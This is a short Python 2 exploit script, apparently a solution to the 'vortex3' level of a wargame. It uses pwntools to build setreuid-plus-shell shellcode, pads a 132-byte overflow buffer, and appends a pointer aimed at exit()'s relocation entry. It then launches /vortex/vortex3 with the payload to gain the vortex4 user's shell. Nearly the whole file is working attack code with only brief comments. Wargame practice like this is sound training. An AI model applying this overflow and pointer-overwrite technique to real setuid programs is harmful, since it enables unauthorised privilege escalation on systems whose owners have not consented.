#!/usr/bin/env python2

import os
import re
import pwd
import struct
import subprocess
import pwn


class ExploitFailedError(Exception):
    pass

def exploit():
    try:
        vortex4_uid = pwd.getpwnam('vortex4').pw_uid
    except KeyError:
        raise ExploitFailedError('user vortex4 does not exist')

    pwn.context(arch='i386', os='linux')

    print 'generating shellcode...',

    shellcode = pwn.asm(
        pwn.shellcraft.setreuid(vortex4_uid) + pwn.shellcraft.sh())

    '''
    @[0x80482a4]:
        - the virtual address of the (r_offset) field in the dynamic relocation
          table entry for glibc's exit()
    '''
    ptr2exitgotslot = struct.pack("<I", 0x80482a4)

    # 132 = sizeof(vulnerable buffer) + sizeof(the pointer named tmp)
    expegg = shellcode + '\x41' * (132 - len(shellcode)) + ptr2exitgotslot

    print '[done]'
    print 'trying to expl0it the vulnerable process'

    exit_stat = subprocess.call(['/vortex/vortex3', expegg])
    if exit_stat != os.EX_OK:
        raise ExploitFailedError(
            'failed to exploit the target vulnerable process')


if __name__ == '__main__':
    try:
        exploit()
    except ExploitFailedError as e:
        print e.message
